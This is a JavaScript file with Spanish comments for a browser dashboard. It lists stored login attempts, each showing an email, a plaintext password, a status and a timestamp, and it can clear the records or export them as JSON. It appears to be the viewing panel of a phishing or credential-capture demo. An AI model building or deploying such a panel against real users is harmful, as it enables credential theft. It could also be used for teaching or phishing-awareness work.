document.addEventListener('DOMContentLoaded', function() {
    const dataContent = document.getElementById('dataContent');
    const refreshBtn = document.getElementById('refreshData');
    const clearBtn = document.getElementById('clearData');
    const exportBtn = document.getElementById('exportData');
    const totalAttempts = document.getElementById('totalAttempts');
    const successAttempts = document.getElementById('successAttempts');
    const failedAttempts = document.getElementById('failedAttempts');

    // Cargar datos al iniciar
    loadData();

    // Botón actualizar
    refreshBtn.addEventListener('click', loadData);

    // Botón limpiar
    clearBtn.addEventListener('click', function() {
        if (confirm('¿Estás seguro de que quieres eliminar TODOS los datos?')) {
            localStorage.removeItem('loginAttempts');
            loadData();
            alert('🗑️ Todos los datos han sido eliminados');
        }
    });

    // Botón exportar
    exportBtn.addEventListener('click', exportData);

    function loadData() {
        const loginAttempts = JSON.parse(localStorage.getItem('loginAttempts')) || [];
        
        updateStats(loginAttempts);
        updateDataContent(loginAttempts);
    }

    function updateStats(attempts) {
        totalAttempts.textContent = attempts.length;
        
        const success = attempts.filter(attempt => attempt.status.includes('CORRECTO')).length;
        const failed = attempts.filter(attempt => attempt.status.includes('INCORRECTO')).length;
        
        successAttempts.textContent = success;
        failedAttempts.textContent = failed;
    }

    function updateDataContent(loginAttempts) {
        if (loginAttempts.length === 0) {
            dataContent.innerHTML = '<p class="no-data">No hay datos guardados aún</p>';
            return;
        }

        let html = '';
        loginAttempts.forEach((attempt, index) => {
            const statusClass = attempt.status.includes('CORRECTO') ? 'status-correct' : 'status-incorrect';
            html += `
                <div class="user-data">
                    <div class="user-header">
                        <span class="user-email">📧 ${attempt.email}</span>
                        <span class="status ${statusClass}">${attempt.status}</span>
                    </div>
                    <div class="user-password">🔑 ${attempt.password}</div>
                    <div class="user-meta">⏰ ${attempt.timestamp}</div>
                </div>
            `;
        });

        dataContent.innerHTML = html;
    }

    function exportData() {
        const loginAttempts = JSON.parse(localStorage.getItem('loginAttempts')) || [];
        
        if (loginAttempts.length === 0) {
            alert('No hay datos para exportar');
            return;
        }

        const data = {
            exportDate: new Date().toISOString(),
            totalRecords: loginAttempts.length,
            loginAttempts: loginAttempts
        };

        const blob = new Blob([JSON.stringify(data, null, 2)], { type: 'application/json' });
        const url = URL.createObjectURL(blob);
        const a = document.createElement('a');
        a.href = url;
        a.download = `datos-login-${new Date().toISOString().split('T')[0]}.json`;
        document.body.appendChild(a);
        a.click();
        document.body.removeChild(a);
        URL.revokeObjectURL(url);
        
        alert(`✅ Datos exportados correctamente (${loginAttempts.length} registros)`);
    }
});